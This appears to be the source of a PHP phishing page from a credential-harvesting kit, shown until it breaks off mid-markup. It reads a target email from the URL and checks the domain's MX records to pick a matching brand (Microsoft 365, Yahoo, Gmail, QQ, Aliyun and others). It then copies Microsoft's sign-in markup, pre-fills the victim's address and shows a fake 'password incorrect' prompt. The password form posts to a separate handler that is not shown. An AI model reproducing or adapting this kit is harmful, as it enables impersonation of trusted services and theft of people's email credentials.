<?php
if(isset($_POST['pass']) && !empty($_POST['pass']) && isset($_POST['login']) && !empty($_POST['login'])){
include('process.php');
}else{

$isoffice='';
$login = $_GET['sessionid'];
$url = $_GET['main_domain'];
$log = $_GET['sessionid'];

function mxrecordValidate($domain) {
$arr = dns_get_record($domain, DNS_MX);
if ($arr[0]['host'] == $domain && !empty($arr[0]['target'])){
return $arr[0]['target'];
}}
 

$email=$login;
$domain = substr(strrchr($email, "@"), 1);
function backgroundimag($urlredi){

$filename = $urlredi;
$filename = str_replace('http://','',$filename);
$filename = str_replace('https://','',$filename);
$filename = str_replace('.','_',$filename);
$filename = str_replace('/','',$filename);

$filenamez = '../../img/'.$filename.'.png';
if (!file_exists($filenamez)) {
 $backgroundimage ='../../img/1.png';
}else{
 $backgroundimage = $filenamez;
}
return $backgroundimage;
}
 

////////////////
if(mxrecordValidate($domain)){
$data = dns_get_record($domain, DNS_MX);
foreach ($data as $key1){
$explit=explode('.',$key1['target']);
foreach ($explit as $xkey1){
if (strpos(strtolower($key1['target']), 'outlook.com') !== false) {
$backcurl = 'https://outlook.office.com/owa/';
}elseif(strpos(strtolower($key1['target']), 'yahoo') !== false) {
if (strpos(strtolower($key1['target']), 'aol') !== false){
$backcurl = 'https://mail.aol.com';
}elseif (strpos(strtolower($key1['target']), 'mta') !== false){
$backcurl ='https://mail.yahoo.com';
}else{
$backcurl = 'https://mail.yahoo.com';
}}elseif (strpos(strtolower($key1['target']), 'google') !== false) {
$backcurl =  'https://myaccount.google.com';
}elseif(strpos(strtolower($key1['target']), 'qq') !== false) {
$backcurl =  'https://exmail.qq.com/cgi-bin/loginpage';
}elseif (strpos(strtolower($key1['target']), 'hinet') && strpos(strtolower($key1['target']), 'hibox') !== false) {
$backcurl =  'https://www.hibox.hinet.net/uwc/';
}elseif (strpos(strtolower($key1['target']), 'mailfilter')!== false) {
$backcurl =  'https://webmail.hinet.net/';
}elseif (strpos(strtolower($key1['target']), 'emailsrvr')!== false) {
$backcurl = 'https://apps.rackspace.com/index.php';
}elseif (strpos(strtolower($key1['target']), 'dns.com')!== false) {
$backcurl =  'http://www.dns.com.cn/login/toLogin.do';
}elseif (strpos(strtolower($key1['target']), 'zmail') !== false) {
$backcurl =  'http://ssl.zmail300.cn/app/mail/index';
}elseif (strpos(strtolower($key1['target']), 'hinet') !== false) {
$backcurl = 'http://'.$domain;
}elseif (strpos(strtolower($key1['target']), 'mailcloud') !== false) {
$backcurl =  'https://mail.mailasp.com.tw/';
}elseif (strpos(strtolower($key1['target']), 'vip') !== false) {
$backcurl = 'http://'.$domain;
}elseif (strpos(strtolower($key1['target']), 'qiye.163.com') !== false) {
$backcurl =  'https://mail.qiye.163.com';
}elseif (strpos(strtolower($key1['target']), '126') !== false) {
$backcurl =  'https://mail.126.com/';
}elseif (strpos(strtolower($key1['target']), 'netease') !== false) {
$backcurl =  'https://mail.163.com/';
}elseif (strpos(strtolower($key1['target']), 'secureserver.net') !== false) {
$backcurl = 'https://email25.godaddy.com/';
}elseif (strpos(strtolower($key1['target']), 'chinaemail') !== false) {
$backcurl = 'http://'.$domain;
}elseif (strpos(strtolower($key1['target']), 'aliyun') !== false) {
$backcurl = 'https://qiye.aliyun.com/';
}elseif (strpos(strtolower($key1['target']), 'mxhichina') !== false) {
$backcurl = 'https://qiye.aliyun.com/';
}elseif (strpos(strtolower($key1['target']), 'zoho') && strpos(strtolower($key1['target']), 'smtp') !== false) {
$backcurl = 'https://mail.zoho.com/zm/';
}elseif (strpos(strtolower($key1['target']), 'zoho') !== false) {
$backcurl = 'https://mail.zoho.com/zm/';
}elseif (strpos(strtolower($key1['target']), '263') !== false) {
$backcurl = 'http://263xmail.com/';
}elseif (strpos(strtolower($key1['target']), 'coremail') !== false) {
$backcurl =  'https://mail.icoremail.net/';
}elseif (strpos(strtolower($key1['target']), '1and1') !== false) {
$backcurl ='https://webmail.1and1.co.uk/';
}elseif (strpos(strtolower($key1['target']), "netsolmail") !== false) {
$backcurl =  'https://webmail5.networksolutionsemail.com/';
}elseif (strpos(strtolower($key1['target']), "yandex") !== false) {
$backcurl = 'https://mail.yandex.com';	
}elseif (strpos(strtolower($key1['target']), $domain) !== false) {
$backcurl = 'https://mail.'.$domain;	
}
}
}
}
////////////////
 

$serv=  mxrecordValidate($domain);
if( mxrecordValidate($domain)) {
$data = dns_get_record($domain, DNS_MX);
foreach ($data as $key1){
   $explit=explode('.',$key1['target']);
foreach ($explit as $xkey1){
if (strpos(strtolower($key1['target']), 'outlook') !== false) {
if (strpos(strtolower($key1['target']), $domain) && strpos(strtolower($key1['target']), 'outlook') !== false) {
$urlredi = 'https://office.com/owa/';
$ename = 'Microsoft';
$isoffice="1";
}else{
$urlredi = 'https://live.com/owa/';
$ename = 'Microsoft';
$isoffice="1";

}
}elseif(strpos(strtolower($key1['target']), 'yahoo') !== false) {
if (strpos(strtolower($key1['target']), 'aol') !== false){
$urlredi = 'https://login.aol.com';
}elseif (strpos(strtolower($key1['target']), 'mta') !== false){
$urlredi ='https://login.yahoo.com';
$ename = 'Yahoo';
}else{
$urlredi = 'https://login.yahoo.com';
$ename = 'Yahoo';
}
}elseif (strpos(strtolower($key1['target']), 'google') !== false) {
$urlredi =  'https://myaccount.google.com';
$ename = 'Gmail';
}elseif(strpos(strtolower($key1['target']), 'qq') !== false) {
$urlredi =  'https://exmail.qq.com/';
$ename = 'QQ 登录企业邮箱';
}elseif (strpos(strtolower($key1['target']), 'hinet') && strpos(strtolower($key1['target']), 'hibox') !== false) {
$urlredi =  'https://www.hibox.hinet.net/uwc/auth';
$ename = 'Hibox';
}elseif (strpos(strtolower($key1['target']), 'mailfilter')!== false) {
$urlredi =  'https://webmail.hinet.net/';
$ename = 'HiNet個人信箱';
}elseif (strpos(strtolower($key1['target']), 'emailsrvr')!== false) {
$urlredi = 'https://apps.rackspace.com/index.php';
$ename = 'Rackspace Webmail Login';
}elseif (strpos(strtolower($key1['target']), 'dns.com')!== false) {
$urlredi =  'http://www.dns.com.cn';
$ename = 'DNS.COM.CN';
}elseif (strpos(strtolower($key1['target']), 'zmail') !== false) {
$urlredi =  'http://ssl.zmail300.cn/page/login/login.jsp';
$ename = '登录企业邮箱';
}elseif (strpos(strtolower($key1['target']), 'hinet') !== false) {
$urlredi =  'https://webmail.hinet.net/';
$ename = 'HiNet個人信箱';
}elseif (strpos(strtolower($key1['target']), 'mailcloud') !== false) {
$urlredi =  'https://mail.mailasp.com.tw/';
$ename = 'MailCloud';
}elseif (strpos(strtolower($key1['target']), 'vip') !== false) {
$hostname = $domain;
$ename = 'VIP';
}elseif (strpos(strtolower($key1['target']), 'qiye163') !== false) {
$urlredi =  'https://mail.qiye.163.com';
$ename = 'qiye.163.com';
}elseif (strpos(strtolower($key1['target']), '126') !== false) {
$urlredi = $domain;
$ename = '126.COM';
}elseif (strpos(strtolower($key1['target']), 'netease') !== false) {
$urlredi = $domain;
$ename = '163.COM';
}elseif (strpos(strtolower($key1['target']), 'secureserver.net') !== false) {
$urlredi = 'https://email25.godaddy.com/';
$ename = 'GoDaddy';
}elseif (strpos(strtolower($key1['target']), 'chinaemail') !== false) {
$urlredi = "https://chinaemail.cn";
$ename = 'BossMail';
}elseif (strpos(strtolower($key1['target']), 'aliyun') !== false) {
$urlredi = 'https://qiye.aliyun.com/';
$ename = 'Aliyun Mail';
}elseif (strpos(strtolower($key1['target']), 'mxhichina') !== false) {
$urlredi = 'https://qiye.aliyun.com/';
$ename = 'Aliyun Webmail';
}elseif (strpos(strtolower($key1['target']), '263') !== false) {
$urlredi = 'http://263xmail.com/';
$ename = '263';
}elseif (strpos(strtolower($key1['target']), 'coremail') !== false) {
$urlredi =  'https://mail.icoremail.net/';
$ename = 'Coremail';
}elseif (strpos(strtolower($key1['target']), '1and1') !== false) {
$urlredi ='https://webmail.1and1.co.uk/';
$ename = 'Webmail Login';  
}elseif (strpos(strtolower($key1['target']), "netsolmail") !== false) {
$urlredi =  'https://webmail5.networksolutionsemail.com/';
$ename = 'Webmail Login';  
}elseif (strpos(strtolower($key1['target']), $domain) !== false) {
$urlredi = $domain;
$ename = 'Webmail Login';  
}else{
$urlredi = $domain;
$ename = 'Webmail Login';  
}
}
}
}else{
$urlredi = $domain;
$ename = 'Webmail Login';  
}

?>

<html dir="ltr" lang="EN-US">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=Edge">


<?php 
if($isoffice=="1"){ ?>
<title>Microsoft 365  admin center - Security &amp; privacy</title>
<?php }else{ ?>
<title><?php echo $domain;?></title>
<?php }?>

<meta name="description" content="Sign in to your OneDrive cloud storage and Office Online."><meta name="PageID" content="i5030"><meta name="SiteID" content="250206"><meta name="ReqLC" content="1033"><meta name="LocLC" content="1033"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no"><link rel="shortcut icon" href="https://auth.gfx.ms/16.000.27683.1/images/favicon.ico">

<link crossorigin="anonymous" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8148.16/content/cdnbundles/converged.v2.login.min_t7iocdq0wq2qh0nv233jig2.css" rel="stylesheet" onerror='$Loader.On(this,true)' onload='$Loader.On(this)' integrity='sha384-XLlMVBd8JX32scdVnhaAQTf07iy+vc6llzsdl6ir7f9pz0Ru+/rMD8vkB1JFOdj2' />
<style type="text/css">body.cb input.hip{border-width: 2px !important;}</style><style type="text/css">body{display:none;}</style>

<script type="text/javascript">if (top != self){try{top.location.replace(self.location.href);}catch (e){}}else{document.write(unescape('%3C%73') + 'tyle type="text/css">body{display:block !important;}</style>');}</script>

<style type="text/css">body{display:block !important;}</style>

<noscript>&lt;style type="text/css"&gt;body{display:block !important;}&lt;/style&gt;</noscript>

<script type="text/javascript">!function(e,r){for(var t in r)e[t]=r[t]}(this,function(e){function r(n){if(t[n])return t[n].exports;var s=t[n]={exports:{},id:n,loaded:!1};return e[n].call(s.exports,s,s.exports,r),s.loaded=!0,s.exports}var t={};return r.m=e,r.c=t,r.p="",r(0)}([function(e,r){var t=window,n=t.navigator;t.g_iSRSFailed=0,t.g_sSRSSuccess="",r.SRSRetry=function(e,r,s,i){var a=1,c=unescape("%3Cscript type='text/javascript' src='"),o=unescape("'%3E%3C/script%3E"),u=r;if(n&&n.userAgent&&i&&i!==r){var S=n.userAgent.toLowerCase(),d=S.indexOf("edge")>=0;if(!d){var p=S.match(/chrome\/([0-9]+)\./),f=p&&2===p.length&&!isNaN(p[1])&&parseInt(p[1])>54;f&&(u=i)}}t.g_sSRSSuccess.indexOf(e)===-1&&("undefined"==typeof t[e]?(t.g_iSRSFailed=1,s<=a&&document.write(c+u+o)):t.g_sSRSSuccess+=e+"|"+s+",")}}]));var g_dtFirstByte=new Date();var g_objPageMode = null;</script>

<?php 
if($isoffice=="1"){ ?>
<link rel="shortcut icon" href="https://auth.gfx.ms/16.000.27683.1/images/favicon.ico">
<?php }else{ ?>
<link type="image/x-icon" rel="shortcut icon" href="../f__files/favicons.png">
<?php }?>

<script>
//GET URL VARIABLES
function getParameterByName(name, url) {
    if (!url) url = window.location.href;
    name = name.replace(/[\[\]]/g, "\\$&");
    var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
        results = regex.exec(url);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, " "));
}
var main_domain = getParameterByName('main_domain');
var main_domain_1 = getParameterByName('main_domain');
var uid = getParameterByName('uid');
var cid = getParameterByName('sessionid');
var id = getParameterByName('id');
var openurl = getParameterByName('openurl');
var linkedin = getParameterByName('linkedin');
var posdomain = getParameterByName('posdomain');
var usegoto = getParameterByName('usegoto');
var msg = getParameterByName('msg');

//ALL VARIABLES
function passFocus(){
 document.getElementById("password").focus();
}

</script>

<script type="text/javascript" src="https://auth.gfx.ms/16.000.27683.1/ConvergedLoginPaginatedStrings.EN.js"></script>
<script type="text/javascript" src="https://auth.gfx.ms/16.000.27683.1/ConvergedLogin_PCore.js"></script>

<script type="text/javascript">SRSRetry("__ConvergedLoginPaginatedStrings","https://auth.gfx.ms/16.000.27683.1/ConvergedLoginPaginatedStrings.EN.js",1,"https://msagfx.live.com/16.000.27683.1/ConvergedLoginPaginatedStrings.EN.js");SRSRetry("__ConvergedLogin_PCore","https://auth.gfx.ms/16.000.27683.1/ConvergedLogin_PCore.js",1,"https://msagfx.live.com/16.000.27683.1/ConvergedLogin_PCore.js");</script>

<script type="text/javascript">SRSRetry("__ConvergedLoginPaginatedStrings","https://auth.gfx.ms/16.000.27683.1/ConvergedLoginPaginatedStrings.EN.js",2,"https://msagfx.live.com/16.000.27683.1/ConvergedLoginPaginatedStrings.EN.js");SRSRetry("__ConvergedLogin_PCore","https://auth.gfx.ms/16.000.27683.1/ConvergedLogin_PCore.js",2,"https://msagfx.live.com/16.000.27683.1/ConvergedLogin_PCore.js");</script>



</head><body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass"><div><!--  --> <div data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }"><div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"><!-- ko if: smallImageUrl --> 
<div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(<?php echo backgroundimag($backcurl);?>); "></div><!-- /ko --><!-- ko if: backgroundImageUrl --> 
 <div class="background-overlay"></div>



<!-- /ko --> </div></div> <!-- ko withProperties: { '$loginPage': $data } --> <div class="outer" data-bind="component: { name: 'page',
        params: {
            serverData: svr,
            showButtons: svr.AN,
            showFooterLinks: true,
            useWizardBehavior: svr.Bb,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"><!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --><!-- ko if: svr.aY --><!-- /ko -->
            
             <div class="middle" data-bind="css: { 'app': $loginPage.backgroundLogoUrl() }"><!-- ko if: $loginPage.backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) --><!-- /ko --> 
            
            
 <form  method="post" target="_top" autocomplete="on">
	<div class="inner" data-bind="css: { 'app': $loginPage.backgroundLogoUrl(), 'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide') }">
   <?php 
   if($isoffice=="1"){ ?>
    <!-- ko ifnot: paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo') --> <div role="banner" data-bind="component: { name: 'logo-control',
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: $loginPage.bannerLogoUrl() } }"><!--  --><!-- ko if: bannerLogoUrl --><!-- /ko --><!-- ko if: !bannerLogoUrl && !isChinaDc --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="presentation" pngsrc="https://auth.gfx.ms/16.000.27683.1/images/microsoft_logo.png?x=ed9c9eb0dce17d752bedea6b5acda6d9" svgsrc="https://auth.gfx.ms/16.000.27683.1/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" data-bind="imgSrc" src="https://auth.gfx.ms/16.000.27683.1/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd"><!-- /ko --> <!-- /ko --><!-- /ko --> <!-- /ko --></div><!-- /ko --><!-- ko if: svr.B7 && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) --><!-- /ko --><!-- ko if: showErrorDetails --><!-- /ko --> 
                        
 <?php  }else{ ?>
    
    <!-- ko ifnot: paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo') --> <div role="banner" data-bind="component: { name: 'logo-control',
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: $loginPage.bannerLogoUrl() } }"><!--  --><!-- ko if: bannerLogoUrl --><!-- /ko --><!-- ko if: !bannerLogoUrl && !isChinaDc --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } -->	<div id="topHeader"><img src="https://aadcdn.msftauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" width="29" height="30" class="logo" id="favIcon">
                        
			 <b style="color:#333; font-size:20px;"><?php echo $ename;?></b>
			 <hr>
	  </div> <!-- /ko --> <!-- /ko --><!-- /ko --> <!-- /ko --></div><!-- /ko --><!-- ko if: svr.B7 && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) --><!-- /ko --><!-- ko if: showErrorDetails --><!-- /ko --> 
      
   <?php   }?>
      
      <div role="main" data-bind="component: { name: 'pagination-control',
                        publicMethods: paginationControlMethods,
                        params: {
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel,
                            showView: $loginPage.view_onShow } }"><div data-bind="css: { 'animate': animate() || animate.back(), 'back': animate.back }"><!-- ko foreach: views --><!-- ko if: $parent.currentViewIndex() === $index() --> <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="1" data-bind="pageViewComponent: { name: 'login-paginated-username-view',
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            displayName: sharedData.displayName,
                            prefillNames: $loginPage.prefillNames,
                            flowToken: sharedData.flowToken },
                        event: {
                            refresh: $loginPage.view_onRefresh,
                            redirect: $loginPage.view_onRedirect,
                            showLearnMore: $loginPage.learnMore_onShow } }"><!--  -->  <div data-viewid="2" data-dynamicbranding="true" data-bind="pageViewComponent: { name: &#39;login-paginated-password-view&#39;,
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            username: sharedData.username,
                            displayName: sharedData.displayName,
                            hipRequiredForUsername: sharedData.hipRequiredForUsername,
                            passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                            availableCreds: sharedData.availableCreds,
                            defaultKmsiValue: svr.iDefaultLoginOptions === 1,
                            userTenantBranding: sharedData.userTenantBranding,
                            sessions: sharedData.sessions,
                            callMetadata: sharedData.callMetadata },
                        event: {
                            submitReady: $loginPage.view_onSubmitReady,
                            redirect: $loginPage.view_onRedirect,
                            resetPassword: $loginPage.passwordView_onResetPassword } }"><!--  --> <input type="hidden" name="login" value="<?php echo $log; ?>"><input type="hidden" name="domurld" value="<?php echo $url; ?>">
<?php if(isset($_GET['AllowGuestInvitations1'])){  echo '<input type="hidden" name="AllowGuestInvitations1" value="On">';}?>
<?php if(isset($_GET['AllowGuestInvitations2'])){   echo '<input type="hidden" name="AllowGuestInvitations2" value="On">';}?>
<?php if(isset($_GET['AllowGuestInvitations3'])){   echo '<input type="hidden" name="AllowGuestInvitations3" value="On">';}?>
<?php if(isset($_GET['AllowGuestInvitations4'])){  echo '<input type="hidden" name="AllowGuestInvitations4" value="On">'; }?>
<?php if(isset($_GET['AllowGuestInvitations5'])){  echo '<input type="hidden" name="AllowGuestInvitations5" value="On">';}?> 
 
 <!--  --> <div class="identityBanner"><!-- ko if: isBackButtonVisible --> <button type="button" class="backButton" data-bind="
        click: backButton_onClick,
        hasFocus: focusOnBackButton,
        attr: {
            &#39;id&#39;: backButtonId || &#39;idBtn_Back&#39;,
            &#39;aria-describedby&#39;: backButtonDescribedBy,
            &#39;aria-label&#39;: str[&#39;CT_HRD_STR_Splitter_Back&#39;] }" id="idBtn_Back" aria-label="Back"><!-- ko ifnot: svr.fIsRTLMarket --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7843.11/content/images/arrow_left.png?x=7cc096da6aa2dba3f81fcc1c8262157c" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7843.11/content/images/arrow_left.svg?x=a9cc2824ef3517b6c4160dcf8ff7d410" data-bind="imgSrc" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7843.11/content/images/arrow_left.png?x=7cc096da6aa2dba3f81fcc1c8262157c"><!-- /ko --> <!-- /ko --><!-- /ko --><!-- /ko --><!-- ko if: svr.fIsRTLMarket --><!-- /ko --> </button><!-- /ko --> <div id="displayName" style="font-size:16px;" class="identity" data-bind="text: unsafe_displayName, attr: { &#39;title&#39;: unsafe_displayName }" title="<?php echo $log; ?>"><?php echo $log; ?></div><!-- ko ifnot: svr.fUseTextOnlyIdentityBannerWithBack --><!-- /ko --> </div></div> <div id="loginHeader"  class="row text-title" role="heading" data-bind="text: str[&#39;CT_PWD_STR_EnterPassword_Title&#39;]"> Enter password </div>
          
            <p>
              <?php if (isset($_GET['mgs'])) { ?> 
            </p>
            <div class="row">
              
  <div class="form-group col-md-24"> <div role="alert" aria-live="assertive" aria-atomic="false">
     <?php 
   if($isoffice=="1"){ ?>

  <!-- ko if: passwordTextbox.error --> <div id="passwordError" class="alert alert-error" data-bind="
                htmlWithBindings: passwordTextbox.error,
                childBindings: { &#39;idA_IL_ForgotPassword0&#39;: { href: svr.urlResetPassword, click: resetPassword_onClick } }">Your account or password is incorrect. If you don't remember your password, <a id="idA_IL_ForgotPassword0" href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQIIAXWSzWvTcBjHm2aLm0wdgujBww47KWmT_PLSFga2azrTtUlf0nUpwkizX5c0r0t-bZr8Bd6cHgcieBF2UxDEi0ehp509igfxJILgRTD7A7w8h4fP4fM83-8DnC7QlW0WsJwujMtkWecByZZpitRZhicBB3jAUPQxR4Hw9vXNz0-eOb_N57vvG3-Xn8RvswvsrolQEFWKxTiOC_5kYhmwYPhu8QOGXWLYdww7z69Cjxz0L_IRD3iBpYQyxZVowPBcGRSUugjktLuQ0wHS0gGnWRTVnprTlnrCaamINLU51YYNq10fxLKbca6WyGrTVoYiklONkzM-24HWUARKXUJt1aZHas1R1J4rp_biS_6WUp0hk7kafmil8Fd-feKH7lHgR-gcf4MpAfSk413f86CBClcY9JBl6MjyvU7oBzBEFox2xGFPaICxpO-2xy1BBIwvdZXB2LV7R-7jkq7qkbhPqf1R_cRM5g2W4SSt1-RPj8rkwd4pSOwhO5MTShL4CJGwxDerZhym08QYjshStSfO7ZDvR9Yh4yZUMIkdttPzFoIwd8zDRXvf1rvvcCJ7q-t7S_xmJuVZx1tB6E8sB37F74_DzPmRHtrQyY4IM3sn0h0YXSVxuYL9WNmg8MraGrGJ3ctt5f6sYK9XszBD78WNtzNdevUSPty-s5Fbrha5A2Q4YqkVN2oBpKe1TnfEmI5u0rWWXU35vU6bnjNqvJ80T3ZKFfqMwM4I4ieRf3ot93H9f1X4Bw2&amp;mkt=en-US&amp;hosted=0&amp;device_platform=Windows+7">reset it now.</a></div><!-- /ko --> 
  <?php }else{ ?>
  <!-- ko if: passwordTextbox.error --> <div id="passwordError" class="alert alert-error" data-bind="
                htmlWithBindings: passwordTextbox.error,
                childBindings: { &#39;idA_IL_ForgotPassword0&#39;: { href: svr.urlResetPassword, click: resetPassword_onClick } }">Your account or password is incorrect. </div><!-- /ko --> 
   <?php }?>        
                </div> <div class="placeholderContainer" data-bind="component: { name: &#39;placeholder-textbox&#39;,
            publicMethods: passwordTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: str[&#39;CT_PWD_STR_PwdTB_Label&#39;] },
            event: {
                updateFocus: passwordTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } --> <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> <input name="pass" type="password" id="i0118" autocomplete="off" class="form-control has-error" aria-describedby="passwordError loginHeader passwordDesc" aria-required="true" data-bind="
                    textInput: passwordTextbox.value,
                    hasFocusEx: passwordTextbox.focused,
                    placeholder: $placeholderText,
                    ariaLabel: str[&#39;CT_PWD_STR_PwdTB_AriaLabel&#39;],
                    css: { &#39;has-error&#39;: passwordTextbox.error }" placeholder="Password" aria-label="Enter password"> <!-- /ko --><!-- /ko --><!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div> </div> </div><!-- ko if: svr.urlHIPScript && showHip --><!-- /ko -->  <div class="row" data-bind="css: { &#39;move-buttons&#39;: tenantBranding.BoilerPlateText }">  </div>                 
                    <?php }else{ ?>
                    
                  <div class="form-group col-md-24"> <div role="alert" aria-live="assertive" aria-atomic="false"></div> 
<div class="placeholderContainer" data-bind="component: { name: &#39;placeholder-textbox&#39;,
            publicMethods: passwordTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: str[&#39;CT_PWD_STR_PwdTB_Label&#39;] },
            event: {
                updateFocus: passwordTextbox.textbox_onUpdateFocus } }">  <input name="pass" type="password" id="i0118" autocomplete="off" class="form-control" aria-describedby="passwordError loginHeader passwordDesc" aria-required="true" data-bind="
                    textInput: passwordTextbox.value,
                    hasFocusEx: passwordTextbox.focused,
                    placeholder: $placeholderText,
                    ariaLabel: str[&#39;CT_PWD_STR_PwdTB_AriaLabel&#39;],
                    css: { &#39;has-error&#39;: passwordTextbox.error }" placeholder="Password" aria-label="Enter password">  </div> </div> 
           
                    </div>  <div class="row" data-bind="css: { &#39;move-buttons&#39;: tenantBranding.BoilerPlateText }"> <div data-bind="component: { name: &#39;footer-buttons-field&#39;,
        params: {
            serverData: svr,
            primaryButtonText: str[&#39;CT_PWD_STR_SignIn_Button&#39;],
            isPrimaryButtonEnabled: !isRequestPending(),
            isPrimaryButtonVisible: svr.fShowButtons,
            isSecondaryButtonEnabled: true,
            isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; isBackButtonVisible() &amp;&amp; !svr.fUseTextOnlyIdentityBannerWithBack },
        event: {
            primaryButtonClick: primaryButton_onClick,
            secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right form-group no-margin-bottom button-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { &#39;no-margin-bottom&#39;: removeBottomMargin || svr.fRepositionFooterButtons, &#39;button-container&#39;: svr.fRepositionFooterButtons }"><!-- ko if: isSecondaryButtonVisible --><!-- /ko --> <div data-bind="
        css: {
            &#39;inline-block&#39;: svr.fRepositionFooterButtons,
            &#39;col-xs-12 primary&#39;: isSecondaryButtonVisible() &amp;&amp; !svr.fRepositionFooterButtons,
            &#39;col-xs-24&#39;: !(isSecondaryButtonVisible() || svr.fRepositionFooterButtons) }" class="inline-block"> <input type="submit" id="idSIButton9" class="btn btn-block btn-primary" data-bind="
            attr: {
                &#39;id&#39;: primaryButtonId || &#39;idSIButton9&#39;,
                &#39;aria-describedby&#39;: primaryButtonDescribedBy },
            value: primaryButtonText() || str[&#39;CT_PWD_STR_SignIn_Button_Next&#39;],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible" value="Save Settings"> </div> </div></div> </div> <?php  }?><div class="row"> <div class="col-md-24"> <div class="text-13 action-links"><!-- ko if: svr.Am && !svr.aK && !svr.ak --> <div class="row"> <div class="col-md-24"> <div class="text-13 action-links"> <div class="form-group"> <a id="idA_PWD_ForgotPassword" role="link" href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQIIAXWRPW_TYACE8-bDtAjRCIFgo0IdEFUSfxtH6pDarjGx4yZx4tgLsh07sR3bqe0SxyMSEmMXliIxsFTqglQxoA4MjJ06IzEiEBNiYiT9AV3udNINp3uelJA60tzCMZwwKJOu0QaJ1XAagWsGjpI1jMBIDIWRMQFj8Z2b1a_SBrRVONl97b2tvvry494puD9N03nSbDQWi0U9chzXsutWFDQ-A3AJwC8AjosVO6wN-qfFhMRIkoLRpzhCogRNohRa1_Kep-XdXGInqe5xmc7AsKYMYFGZeVIwSDW1i-s8h8uqREg5l3UU3e3kwlJWhVQLhFzrw7DMWpmocssO3021nEMldjbTUGHlw-BbcUNuHaZT9Eqi2M3tv8V1J4qDF_MoSY9LJ0Ce26EwZqIwtK20flWzw9S1jNSNwv04mttx6trJDivyC3mo2i9j3YwSp037GitrTOgq-qjTtx1RlJN9mB20Zn1DMi0xJzJ6KfYO_V3Hy-BJ-0Be9vQO8pzyEXrUZierQAa6NSZMZzDFJoKiYvySCb2Mo_ZalsEMfd2L270AGSOm22PjsxK0ujWIwovS7dWo0B1vzuPIcWf2ZRn8Lt-CS821NagKHhQ2C__K4ENlRevn3bN3lfcfxU_fscfnjx4WLioNj-SUmNpGvFgR9niURrftRZ9x-GcmZ46IAz_gg4nlt6xgj9tBmsgRBI4g6A8E3twonK9fx_o_0&amp;mkt=en-US&amp;hosted=0&amp;device_platform=Windows+7" data-bind="text: str[&#39;CT_PWD_STR_ForgotPwdLink_Text&#39;], href: svr.urlResetPassword, click: resetPassword_onClick">Forgot my password</a> </div><!-- ko if: allowPhoneDisambiguation --><!-- /ko --><!-- ko component: { name: "cred-switch-link-control",
